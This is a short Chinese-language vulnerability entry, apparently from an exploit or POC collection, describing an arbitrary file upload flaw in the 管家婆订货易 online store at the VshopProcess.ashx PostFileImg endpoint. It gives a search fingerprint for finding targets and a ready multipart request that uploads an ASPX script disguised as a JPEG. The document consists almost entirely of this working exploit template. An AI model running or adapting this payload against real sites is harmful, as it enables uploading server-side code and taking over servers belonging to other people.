# 管家婆订货易在线商城VshopProcess存在任意文件上传漏洞

管家婆订货易在线商城 ｜ 文件上传 ｜ —
- **指纹**：`title="订货易"`
- **请求**：`POST /API/VshopProcess.ashx?action=PostFileImg HTTP/1.1`

**Payload**
```
------WebKitFormBoundarytCOFhbEjc3IfYaY5
Content-Disposition: form-data; name="fileup1i"; filename="a.aspx"
Content-Type: image/jpeg
<% Response.Write("Test"); %>
------WebKitFormBoundarytCOFhbEjc3IfYaY5--
```